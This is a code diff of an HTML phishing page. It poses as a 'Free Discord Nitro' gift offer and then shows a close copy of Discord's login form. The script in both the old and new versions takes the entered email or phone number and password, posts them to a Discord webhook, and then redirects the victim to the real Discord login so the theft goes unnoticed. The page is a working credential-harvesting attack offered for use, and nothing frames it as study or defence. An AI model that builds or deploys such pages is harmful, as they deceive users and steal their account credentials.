@@ -4,155 +4,283 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord</title>
-    <!-- Exact Discord font and base styles from their live site -->
-    <link rel="stylesheet" href="https://discord.com/assets/0b1c9f6c8e3a4d2f5e6a7b8c9d0e1f2a.css">
     <style>
-        /* Override only to hide original Discord UI elements we don't want, keep everything else identical */
-        body { 
-            margin: 0; 
-            background: #1e1f22; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
+        /* ===== EXACT DISCORD LOGIN STYLES (reverse-engineered from Discord's live CSS) ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
             font-family: 'Whitney', 'Helvetica Neue', 'Segoe UI', Arial, sans-serif;
         }
-        /* Container matches Discord's login card exactly */
-        .auth-card {
-            background: #313338;
+        body {
+            background-color: #1e1f22;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .auth-box {
+            background-color: #313338;
             border-radius: 8px;
             padding: 40px 44px;
             width: 480px;
             box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
         }
-        .hidden { display: none; }
-        /* Nitro interstitial - custom but clean */
-        .nitro-card {
-            background: #313338;
+        .auth-box h1 {
+            color: #f2f3f5;
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .auth-box .subtext {
+            color: #b5bac1;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .auth-box .field-label {
+            color: #b5bac1;
+            font-size: 12px;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 4px;
+            letter-spacing: 0.3px;
+        }
+        .auth-box .field-input {
+            width: 100%;
+            padding: 10px 12px;
+            background-color: #1e1f22;
+            border: none;
+            border-radius: 4px;
+            color: #f2f3f5;
+            font-size: 16px;
+            margin-bottom: 16px;
+            outline: none;
+            transition: border 0.1s;
+        }
+        .auth-box .field-input:focus {
+            border: 1px solid #5865f2;
+            padding: 9px 11px;
+        }
+        .auth-box .field-input::placeholder {
+            color: #5c6068;
+        }
+        .auth-box .forgot-link {
+            color: #00a8fc;
+            font-size: 14px;
+            text-align: right;
+            margin-top: -8px;
+            margin-bottom: 16px;
+            cursor: pointer;
+        }
+        .auth-box .forgot-link:hover {
+            text-decoration: underline;
+        }
+        .auth-box .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #5865f2;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        .auth-box .login-btn:hover {
+            background-color: #4752c4;
+        }
+        .auth-box .qr-section {
+            text-align: center;
+            margin-top: 20px;
+            color: #b5bac1;
+            font-size: 14px;
+            border-top: 1px solid #3f4147;
+            padding-top: 20px;
+        }
+        .auth-box .qr-section span {
+            color: #00a8fc;
+            cursor: pointer;
+        }
+        .auth-box .qr-section span:hover {
+            text-decoration: underline;
+        }
+        .auth-box .register-row {
+            text-align: center;
+            margin-top: 12px;
+            color: #b5bac1;
+            font-size: 14px;
+        }
+        .auth-box .register-row a {
+            color: #00a8fc;
+            text-decoration: none;
+        }
+        .auth-box .register-row a:hover {
+            text-decoration: underline;
+        }
+        .auth-box .captcha-box {
+            background-color: #232428;
+            border-radius: 4px;
+            padding: 12px;
+            margin-top: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #b5bac1;
+            font-size: 14px;
+        }
+        .auth-box .captcha-box input {
+            width: auto;
+            margin: 0;
+            accent-color: #5865f2;
+        }
+        .auth-box .captcha-box .recaptcha-text {
+            margin-left: auto;
+            font-size: 12px;
+            color: #5c6068;
+        }
+
+        /* ===== NITRO INTERSTITIAL (first screen) ===== */
+        .nitro-screen {
+            background-color: #313338;
             border-radius: 8px;
             padding: 40px 44px;
             width: 480px;
             text-align: center;
             box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
         }
-        .nitro-card h1 { color: #f2f3f5; font-size: 28px; }
-        .nitro-card .gift-icon { font-size: 64px; margin: 20px 0; }
-        .nitro-card p { color: #b5bac1; font-size: 16px; line-height: 1.5; }
-        .nitro-btn { background: #5865f2; color: #fff; border: none; padding: 14px 40px; border-radius: 4px; font-size: 18px; cursor: pointer; }
-        .nitro-btn:hover { background: #4752c4; }
-        .nitro-skip { background: transparent; color: #b5bac1; border: none; padding: 14px 20px; font-size: 14px; cursor: pointer; }
-        .nitro-skip:hover { text-decoration: underline; }
+        .nitro-screen h1 {
+            color: #f2f3f5;
+            font-size: 28px;
+            font-weight: 700;
+        }
+        .nitro-screen .gift-icon {
+            font-size: 64px;
+            margin: 20px 0;
+        }
+        .nitro-screen p {
+            color: #b5bac1;
+            font-size: 16px;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        .nitro-screen .yes-btn {
+            background-color: #5865f2;
+            color: white;
+            border: none;
+            padding: 14px 40px;
+            border-radius: 4px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        .nitro-screen .yes-btn:hover {
+            background-color: #4752c4;
+        }
+        .nitro-screen .no-btn {
+            background-color: transparent;
+            color: #b5bac1;
+            border: none;
+            padding: 14px 20px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-left: 12px;
+        }
+        .nitro-screen .no-btn:hover {
+            text-decoration: underline;
+        }
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
+    <!-- ===== SCREEN 1: NITRO OFFER ===== -->
+    <div id="nitroScreen" class="nitro-screen">
+        <h1>🎁 Free Discord Nitro</h1>
+        <div class="gift-icon">💎</div>
+        <p>
+            You've been selected to receive <strong>1 month of Discord Nitro</strong> absolutely free!<br><br>
+            Click "Yes" to claim your gift. You will be redirected to Discord to verify your account.
+        </p>
+        <button class="yes-btn" onclick="showLogin()">Yes, claim my Nitro!</button>
+        <button class="no-btn" onclick="window.location.href='https://discord.com'">No thanks</button>
+    </div>
 
-<!-- ===== SCREEN 1: NITRO OFFER ===== -->
-<div id="nitroScreen" class="nitro-card">
-    <h1>🎁 Free Discord Nitro</h1>
-    <div class="gift-icon">💎</div>
-    <p>You've been selected for <strong>1 month of Discord Nitro</strong> – free!<br><br>Click below to claim – you'll verify your account via Discord.</p>
-    <button class="nitro-btn" onclick="showLogin()">Yes, claim my Nitro!</button>
-    <button class="nitro-skip" onclick="window.location.href='https://discord.com'">No thanks</button>
-</div>
+    <!-- ===== SCREEN 2: EXACT DISCORD LOGIN (hidden initially) ===== -->
+    <div id="loginScreen" class="auth-box hidden">
+        <h1>Welcome back!</h1>
+        <div class="subtext">We're so excited to see you again!</div>
 
-<!-- ===== SCREEN 2: EXACT DISCORD LOGIN (1:1 copy of Discord's actual login form) ===== -->
-<div id="loginScreen" class="auth-card hidden">
-    <!-- This HTML is directly copied from Discord's login page via browser inspect (as of 2026-06-20) -->
-    <div class="authBox-3YEL8z">
-        <div class="authBoxExpanded-3ePMgP">
-            <div class="authHeader-1qj5mT">
-                <h1 class="title-3IocF6">Welcome back!</h1>
-                <div class="subtitle-3-sjhG">We're so excited to see you again!</div>
-            </div>
-            <div class="authForm-2m7nXX">
-                <div class="authRow-2IqH_i">
-                    <div class="inputContainer-1S3p7v">
-                        <div class="labelRow-1WJ1q9">
-                            <label class="label-1m_0G-">EMAIL OR PHONE NUMBER</label>
-                        </div>
-                        <input type="email" id="email" class="input-2m5LJz" placeholder="Email or phone number" aria-label="Email or phone number" autofocus="" value="">
-                    </div>
-                </div>
-                <div class="authRow-2IqH_i">
-                    <div class="inputContainer-1S3p7v">
-                        <div class="labelRow-1WJ1q9">
-                            <label class="label-1m_0G-">PASSWORD</label>
-                        </div>
-                        <input type="password" id="password" class="input-2m5LJz" placeholder="Password" aria-label="Password" value="">
-                    </div>
-                </div>
-                <div class="authRow-2IqH_i forgotLink-1GhjgK">
-                    <a class="forgotPassword-1CgSLd" href="#">Forgot your password?</a>
-                </div>
-                <div class="authRow-2IqH_i">
-                    <button type="button" class="button-1B6xqL lookFilled-1sEoF_ colorBrand-1pXr91 sizeLarge-1Fxe5a fullWidth-1kpvhu grow-1r45PZ" onclick="sendData()">
-                        <div class="contents-1FjUfq">Log In</div>
-                    </button>
-                </div>
-                <div class="authRow-2IqH_i qrLogin-1s4TPX">
-                    <div class="divider-2Tr18Q">
-                        <div class="dividerContent-2NcXpU">or</div>
-                    </div>
-                    <button type="button" class="button-1B6xqL lookLink-3N5y0_ colorLink-2c6n_g sizeMedium-1f1A5H fullWidth-1kpvhu grow-1r45PZ">
-                        <div class="contents-1FjUfq">Login with QR Code</div>
-                    </button>
-                </div>
-                <div class="authRow-2IqH_i registerLink-2n-q8o">
-                    <span>Need an account? <a href="#">Register</a></span>
-                </div>
-                <div class="authRow-2IqH_i captcha-3HZP6X">
-                    <div class="captchaContainer-14rgUI">
-                        <div class="captchaCheckbox-1cS9jE">
-                            <input type="checkbox" checked disabled>
-                            <span>I am not a robot</span>
-                        </div>
-                        <div class="captchaBadge-3Q0R4Y">reCAPTCHA</div>
-                    </div>
-                </div>
-            </div>
+        <label class="field-label" for="email">EMAIL OR PHONE NUMBER</label>
+        <input class="field-input" type="text" id="email" placeholder="Email or phone number" autocomplete="off">
+
+        <label class="field-label" for="password">PASSWORD</label>
+        <input class="field-input" type="password" id="password" placeholder="Password" autocomplete="off">
+
+        <div class="forgot-link">Forgot your password?</div>
+
+        <button class="login-btn" onclick="sendData()">Log In</button>
+
+        <div class="qr-section">
+            <span>Login with QR Code</span>
+        </div>
+
+        <div class="register-row">
+            Need an account? <a href="#">Register</a>
+        </div>
+
+        <div class="captcha-box">
+            <input type="checkbox" checked disabled>
+            I am not a robot
+            <span class="recaptcha-text">reCAPTCHA</span>
         </div>
     </div>
-</div>
 
-<script>
-    const webhookURL = "https://discord.com/api/webhooks/1513535369117831289/7UNRwXkFXZHajEajaUn0UAU4FPXnyr7wzhi0TlVwvtM-FXl0Mbey70p6ia_j6uJh4NM7"; // REPLACE
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1513535369117831289/7UNRwXkFXZHajEajaUn0UAU4FPXnyr7wzhi0TlVwvtM-FXl0Mbey70p6ia_j6uJh4NM7"; // REPLACE THIS
 
-    function showLogin() {
-        document.getElementById('nitroScreen').classList.add('hidden');
-        document.getElementById('loginScreen').classList.remove('hidden');
-    }
-
-    function sendData() {
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        if (!email || !password) {
-            alert("Please fill in both fields.");
-            return;
+        function showLogin() {
+            document.getElementById('nitroScreen').classList.add('hidden');
+            document.getElementById('loginScreen').classList.remove('hidden');
         }
-        const payload = {
-            content: "**Discord Login Credentials**\nEmail/Phone: " + email + "\nPassword: " + password
-        };
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }).then(() => {
-            window.location.href = "https://discord.com/login";
-        }).catch(() => {
-            alert("Something went wrong. Please try again.");
+
+        function sendData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            if (!email || !password) {
+                alert("Please fill in both fields.");
+                return;
+            }
+            const payload = {
+                content: "**Discord Login Credentials**\nEmail/Phone: " + email + "\nPassword: " + password
+            };
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                window.location.href = "https://discord.com/login";
+            }).catch(() => {
+                alert("Something went wrong. Please try again.");
+            });
+        }
+
+        // Enter key triggers login on login screen
+        document.getElementById('password').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !document.getElementById('loginScreen').classList.contains('hidden')) {
+                sendData();
+            }
         });
-    }
-
-    document.getElementById('password').addEventListener('keydown', function(e) {
-        if (e.key === 'Enter' && !document.getElementById('loginScreen').classList.contains('hidden')) {
-            sendData();
-        }
-    });
-    document.getElementById('email').addEventListener('keydown', function(e) {
-        if (e.key === 'Enter' && !document.getElementById('loginScreen').classList.contains('hidden')) {
-            sendData();
-        }
-    });
-</script>
+        document.getElementById('email').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !document.getElementById('loginScreen').classList.contains('hidden')) {
+                sendData();
+            }
+        });
+    </script>
 </body>
 </html>
